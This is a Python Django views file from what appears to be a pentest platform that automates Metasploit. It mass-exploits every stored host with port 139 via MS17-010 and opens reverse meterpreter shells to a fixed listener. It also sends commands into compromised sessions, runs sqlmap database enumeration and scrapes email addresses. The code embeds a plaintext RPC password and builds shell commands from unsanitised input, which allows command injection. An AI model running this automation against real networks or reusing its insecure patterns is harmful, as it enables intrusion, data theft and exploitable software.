                spf.vulneravel = 0
                spf.descricao = res
                spf.save()
            except:
                spfDominio.objects.create(Dominio = Dominio.objects.get(nome=dominio,ip__rede=vpn),
                                          vulneravel = 0,
                                          descricao = res)
        return redirect('/')

def EmailsFuncao(request,dominio,rede_vpn):
    contador = 0
    os.system("rm -f arquivos/publico/email/" + str(dominio))
    try:
        Pentest_Rede.objects.get(rede=Rede.objects.get(id=rede_vpn),usuario=User.objects.get(id=request.user.id))
    except:
        return HttpResponse("VOCÊ NÃO TEM PERMISSÃO PRA ISSO")
    vpn = Rede.objects.get(id=rede_vpn)
    while (contador < 100):
        os.system("echo 'página" + str(int(contador / 10)) + "' ")
        os.system('sudo lynx --dump "https://google.com/search?&q=intext:' + str(dominio) + '&start=' + str(
            contador) + '" | grep "@"' + str(dominio) + '>> arquivos/publico/email/' + str(dominio))
        contador = contador + 10
        time.sleep(10)

    LimparEmail(dominio,vpn)


    return redirect('/')

def LimparEmail(dominio,vpn):
    import re
    ref_arquivo = open("arquivos/publico/email/"+str(dominio), "r")

    m = re.findall(r"\w*@" + str(dominio), ref_arquivo.read())
    emails = []
    print(ref_arquivo)
    for a in m:
        if a in emails:
            pass
        else:
            if a != "@" + str(dominio):
                emails.append(a)
    print(emails)
    ref_arquivo.close()
    os.system("rm -f arquivos/publico/email/"+str(dominio))
    for a in emails:

        try:
            Emails.objects.get(email = a,
                               Dominio= Dominio.objects.get(nome=dominio,ip__rede = vpn))
        except:

            Emails.objects.create(email = a,
                                  Dominio= Dominio.objects.get(nome=dominio,ip__rede = vpn))
        os.system("echo '" + str(a) + "' >> arquivos/publico/email/"+str(dominio))

@login_required(login_url='/login/')
def ligarMetaSploi(request):
    class Ips:
        def __init__(self,ip,sessao):
            self.ip =  ip
            self.sessao = sessao

    client = MsfRpcClient(SenhaMsfConsole.objects.get(id=1).senha, ssl=False)

    print(client.sessions.list)

    hosts_invadidos = []


    for a in client.sessions.list:
        dicionario = {}
        c = client.sessions.list


        ip = Ips(str(c[str(a)]['session_host']),a)
        hosts_invadidos.append(ip)



    """
    porta_saida = 4444
    exploit = client.modules.use('exploit', 'windows/smb/ms17_010_psexec')
    exploit['RHOSTS'] = '172.16.1.233'
    payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
    payload['LHOST'] = '172.20.1.103'
    payload['LPORT'] = porta_saida
    porta_saida = porta_saida + 1
    print(exploit.execute(payload=payload))
    """
    dados = {
        "hosts": hosts_invadidos,
    }
    return render(request,'shell.html',dados)



@login_required(login_url='/login/')
def procurarExploits(request):
    class Ips:
        def __init__(self,ip,sessao):
            self.ip =  ip
            self.sessao = sessao

    client = MsfRpcClient(SenhaMsfConsole.objects.get(id=1).senha, ssl=False)


    exploits=  client.modules.exploits
    return render(request,'exploits.html',{'exploits':exploits})

@login_required(login_url='/login/')
def exploit3(request,sessao):
    client = MsfRpcClient(SenhaMsfConsole.objects.get(id=1).senha, ssl=False)

    comando = request.POST.get('comando')

    shell = client.sessions.session(sessao)
    if comando == None:
        comando = 'ipconfig'
    shell.write(comando)
    print(comando)
    time.sleep(5)
    dados = {"saida": str(shell.read()),
             "sessao": sessao}
    return render(request,'shell.html',dados)



@login_required(login_url='/login/')
def exploit(request):
    client = MsfRpcClient('Z1rS5DW#9N1e', ssl=False)
    ip_entrou = []
    porta_saida = 9998

    for ip in IP.objects.all():
        validar = 0
        for a in client.sessions.list:
            c = client.sessions.list

            if str(ip.ip) == str(c[str(a)]['session_host']):
                validar = 1
        validando_porta = 0
        if validar == 0:
            for porta in Porta.objects.filter(ip=ip):
                #print(porta.porta)
                if int(porta.porta) == 139:
                    validando_porta=1
            if validando_porta == 1:
                    client = MsfRpcClient('Z1rS5DW#9N1e', ssl=False)

                    exploit = client.modules.use('exploit', 'windows/smb/ms17_010_psexec')
                    exploit['RHOSTS'] = str(ip.ip)
                    payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
                    payload['LHOST'] = '172.20.1.184'
                    payload['LPORT'] = porta_saida
                    #print(ip.ip)
                    porta_saida = porta_saida + 1
                    exploit.execute(payload=payload)
                    print("IP: " + str(ip.ip) + " porta: " + str(porta_saida))
                    #print(client.sessions.list)
                    #print(type(client.sessions.list))

                    for aa in client.sessions.list:
                        cc = client.sessions.list
                        print("sessões")
                        print(cc[str(aa)]['session_host'])

        #print(a['session_host'])
    #print(client.consoles.)
    #print(client.module)
    #exploit = client.modules.use('exploit', 'CVE-2017-0143')
    #print(exploit)
    """
    for a in client.modules.exploits:
        exploit = client.modules.use('exploit', a)
        print(exploit.options)
    """
    #shell = client.sessions.session('1')
    #shell.write('exit')
    #print(shell.read())
    return redirect('/exploit')




@login_required(login_url='/login/')
def usandoExploit(request):
    exploit = request.POST.get('exploit')

    class Ips:
        def __init__(self,ip,sessao):
            self.ip =  ip
            self.sessao = sessao

    client = MsfRpcClient(SenhaMsfConsole.objects.get(id=1).senha, ssl=False)




    exploits=  client.modules.use('exploit',exploit)
    exploits_opcao = exploits.options
    exploits_requerido = exploits.missing_required
    exploit_payload = exploits.targetpayloads()
    return render(request,'opcoesExploit.html',{'exploit':exploit,'exploits':exploits.description,'opcoes':exploits_opcao,'obrigatorio':exploits_requerido,'payloads':exploit_payload})

@login_required(login_url='/login/')
def rodandoExploit(request):
    pass
    """
    client = MsfRpcClient('Z1rS5DW#9N1e', ssl=False)

    exploit = client.modules.use('exploit', 'windows/smb/ms17_010_psexec')
    exploit['RHOSTS'] = str(ip.ip)
    payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
    payload['LHOST'] = '172.20.1.184'
    payload['LPORT'] = porta_saida
    # print(ip.ip)
    porta_saida = porta_saida + 1


    exploit.execute(payload=payload)
    """

@login_required(login_url='/login/')
def rodandoExploitCerto(request):
    client = MsfRpcClient('Z1rS5DW#9N1e', ssl=False)
    objeto = ExploitRodar.objects.get(id=request.POST.get('objeto'))

    exploit = client.modules.use('exploit', objeto.exploit)
    payload = client.modules.use('payload',objeto.payload)

    for requestinho in request.POST:
        print(requestinho)

        if requestinho in payload.options:
            if request.POST.get(requestinho) != "":
                try:
                    payload[requestinho] = str(request.POST.get(requestinho))
                except:
                    try:
                        payload[requestinho] = bool(request.POST.get(requestinho))
                    except:

                        try:
                            payload[requestinho] = float(request.POST.get(requestinho))
                        except:
                            pass

                Exploit_Payload.objects.create(exploit=objeto,
                                               nome=requestinho,
                                               conteudo=payload[requestinho],
                                               tipo = 1)



    # saida = exploit.execute(payload=payload)
    return redirect('/rodarExploits/')


@login_required(login_url='/login/')
def rodandoExploit(request):
    client = MsfRpcClient('Z1rS5DW#9N1e', ssl=False)
    exploit  = client.modules.use('exploit', request.POST.get('exploit'))
    payload = client.modules.use('payload', request.POST.get('payload'))

    exploit_rodar = ExploitRodar.objects.create(nome='Criado Via views.py', exploit= request.POST.get('exploit'), payload=request.POST.get('payload'))
    for requestinho in request.POST:
        print(requestinho)



        if requestinho in exploit.options:
                if  request.POST.get(requestinho) != "":
                    try:
                        exploit[requestinho]=  request.POST.get(requestinho)
                    except:
                        try:
                            exploit[requestinho]=  bool(request.POST.get(requestinho))
                        except:
                            exploit[requestinho]=  float(request.POST.get(requestinho))

                    Exploit_Payload.objects.create(exploit=exploit_rodar,
                                                   nome= requestinho,
                                                   conteudo=exploit[requestinho])


        if requestinho in payload.options:
                if  request.POST.get(requestinho) != "":
                    payload[requestinho]=  request.POST.get(requestinho)


    exploits_opcao = payload.options
    exploits_requerido = payload.missing_required

    #saida = exploit.execute(payload=payload)
    return render(request,'payloadOpcoes.html',{'exploit':exploit,'exploits':exploit.description,'opcoes':exploits_opcao,'obrigatorio':exploits_requerido,'objeto':exploit_rodar})


@login_required(login_url='/login/')
def exploit3(request,sessao):



    client = MsfRpcClient('Z1rS5DW#9N1e', ssl=False)
    comando = request.POST.get('comando')

    shell = client.sessions.session(sessao)
    if comando == None:
        comando = 'ipconfig'
    shell.write(comando)
    print(comando)
    time.sleep(5)
    resposta = str(shell.read())
    dados = {"saida": resposta,
             "sessao": sessao}
    return render(request,'shell.html',dados)

def LigarMetaexploit():
    try:
        client = MsfRpcClient(SenhaMsfConsole.objects.get(id=1).senha, ssl=False)
        #os.system(f'msfrpcd -P {SenhaMsfConsole.objects.get(id=1).senha} -S')

    except:
        try:
            SenhaMsfConsole.objects.create(id=1,
                                           senha ="Z1rS5DW#9N1e" )
            os.system(f'msfrpcd -P {SenhaMsfConsole.objects.get(id=1).senha} -S')
        except:
            os.system(f'msfrpcd -P {SenhaMsfConsole.objects.get(id=1).senha} -S')


def theHarvester(request,dominio,rede_vpn):
    contador = 0
    os.system(f'rm -f theHarvester/resultado{dominio}.xml')
    try:
        Pentest_Rede.objects.get(rede=Rede.objects.get(id=rede_vpn),usuario=User.objects.get(id=request.user.id))
    except:
        return HttpResponse("VOCÊ NÃO TEM PERMISSÃO PRA ISSO")
    vpn = Rede.objects.get(id=rede_vpn)


    res = os.system(f'theHarvester -d {dominio} -l 100 -b google -f arquivos/theHarvester/resultado{dominio}.xml')
    time.sleep(10)
    import xml.etree.ElementTree as ET
    tree = ET.parse(f'arquivos/theHarvester/resultado{dominio}.xml')
    root = tree.getroot()
    usuario  = User.objects.get(id=request.user.id)

    for child in root:
        print(child.tag)
        print(child.text)
        if child.tag == 'email':
            try:
                Emails.objects.get(email=child.text,
                                   Dominio=Dominio.objects.get(nome=dominio, ip__rede=vpn))
            except:

                Emails.objects.create(email=child.text,
                                      Dominio=Dominio.objects.get(nome=dominio, ip__rede=vpn))

        if child.tag == 'host':

            try:
                    print(child.find('ip').text)
                    print(child.find('hostname').text)
                    try:
                        verificarSeExisteSeNaoCriar(child.find('ip').text, usuario, vpn)
                        SubDominio.objects.get(Dominio=Dominio.objects.get(nome=dominio, ip__rede=vpn),
                                               host=child.find('hostname').text,
                                               ip=IP.objects.get(ip=child.find('ip').text,rede=vpn))
                    except:
                        SubDominio.objects.create(Dominio=Dominio.objects.get(nome=dominio, ip__rede=vpn),
                                               host=child.find('hostname').text,
                                               ip=IP.objects.get(ip=child.find('ip').text, rede=vpn))

            except:
                    print(child.find('ip'))


    return redirect('/')


def verExploitsRodar(request):
    opcoes = ExploitRodar.objects.all()

    return render(request,'rodarExploits.html',{'opcoes':opcoes})


def rodar(request,id):
    exploit_objeto = ExploitRodar.objects.get(id=id)



    client = MsfRpcClient('Z1rS5DW#9N1e', ssl=False)

    exploit = client.modules.use('exploit', exploit_objeto.exploit)

    conteudo_Exploit = Exploit_Payload.objects.filter(exploit=exploit_objeto, tipo=0)

    for conteudo  in conteudo_Exploit:
        exploit[conteudo.nome] = conteudo.conteudo
    payload = client.modules.use('payload', exploit_objeto.payload)

    conteudo_Payload = Exploit_Payload.objects.filter(exploit=exploit_objeto, tipo=1)
    for conteudo  in conteudo_Payload:
        payload[conteudo.nome] = conteudo.conteudo


    exploit.execute(payload=payload)
    return redirect('/exploit2')


def sqlmap(request,id):
    data_Agora = dataAtual()

    diretorio_objeto = Diretorios.objects.get(id=id)
    ip = Diretorios.objects.get(id=id).ip.ip
    ip_objeto = Diretorios.objects.get(id=id).ip
    porta = Diretorios.objects.get(id=id).porta
    path = Diretorios.objects.get(id=id).path

    queryparameters = QueryParameteres.objects.filter(diretorio=diretorio_objeto)

    querys = "?"
    for query in queryparameters:
        querys = querys + f'{query.parametro}={query.valor}&'
    querys = querys[:-1]
    path = path + querys
    if porta == 443:
        os.system(f'sqlmap -u https://{ip}:{porta}{path} --dbs --answers="follow=Y" --batch > arquivos/sqlmap/"{request.user}{data_Agora}".txt')
        comando = f'sqlmap -u https://{ip}:{porta}{path} --dbs --answers="follow=Y" --batch > arquivos/sqlmap/"{request.user}{data_Agora}".txt'
    else:
        os.system(f'sqlmap -u http://{ip}:{porta}{path} --dbs --answers="follow=Y" --batch > arquivos/sqlmap/"{request.user}{data_Agora}".txt')
        comando = f'sqlmap -u http://{ip}:{porta}{path} --dbs --answers="follow=Y" --batch > arquivos/sqlmap/"{request.user}{data_Agora}".txt'

    SqlComandos.objects.create(ip=ip_objeto,
                                dataAgora=data_Agora,
                                usuario=request.user,
                                comando=comando,
                                porta=porta)
@login_required(login_url='/login/')
def parserSite(request,id):

        Pentest_Rede.objects.get( rede=Diretorios.objects.get(id=id).ip.rede,usuario=User.objects.get(id=request.user.id))
        data_Agora = dataAtual()
        diretorio_objeto =  Diretorios.objects.get(id=id)
        ip = Diretorios.objects.get(id=id).ip.ip
        ip_objeto = Diretorios.objects.get(id=id).ip
        porta = Diretorios.objects.get(id=id).porta
        path = Diretorios.objects.get(id=id).path

        queryparameters = QueryParameteres.objects.filter(diretorio=diretorio_objeto)

        querys = "?"
        for query in queryparameters:
            querys=querys+f'{query.parametro}={query.valor}&'
        querys = querys[:-1]
        path = path + querys

        from bs4 import BeautifulSoup
        import requests
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"}
        try:
            r = requests.get(f'http://{ip}:{porta}{path}', headers=headers)
        except:
            r = requests.get(f'https://{ip}:{porta}{path}', headers=headers)


        from urllib.parse import urlparse
        soup = BeautifulSoup(r.text, 'html.parser')
        artist_name_list_items = soup.find_all('a')
        print(artist_name_list_items)
        listateste = []
        for artist_name in artist_name_list_items:
            names = artist_name.get('href')
            print(names)
            if names[0] == "/":
                path = names
            else:

                splitando = path.split('/')

                variavel_tamanho = len(splitando)

                splitando[variavel_tamanho - 1] = str(names)
                voltando = ""
                for voltar in splitando:
                    voltando = voltando + voltar + "/"

                voltando = voltando[:-1]
                path = voltando

            try:
                    path_filtrar = f'{path}'.split('?')[0]
                    listateste.append(f'{path}'.split('?')[1])
            except:
                    path_filtrar = path

            diretorio = verificarSeExisteDiretorioSeNaoCriar(ip_objeto, porta, path_filtrar, 200, path)
            alterarDiretoriosHttpCode(ip_objeto, porta, path_filtrar, 200, diretorio, path)

        return redirect('/inicio/')